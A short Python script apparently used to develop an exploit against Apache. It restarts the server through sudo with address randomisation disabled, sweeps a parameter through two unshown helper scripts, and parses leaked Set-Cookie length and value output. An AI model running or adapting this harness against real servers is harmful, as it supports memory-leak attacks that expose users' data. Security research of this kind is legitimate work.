#!/usr/bin/env python3
import subprocess,time,re
def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True)
def stopstart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.25)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.35)
for n in list(range(0,61)):
    stopstart()
    sh(f"python3 send_a_s56.py {n} 12 17 >/dev/null 2>&1")
    r=sh("python3 b_ht56_noforge.py 900 2>&1")
    m=re.search(r'SETCOOKIE_LEN (\d+)',r.stdout)
    v=re.search(r'VALUE (.*)',r.stdout)
    print(f"N={n} len={m.group(1) if m else -1} {(v.group(1)[:44] if v else '')}",flush=True)
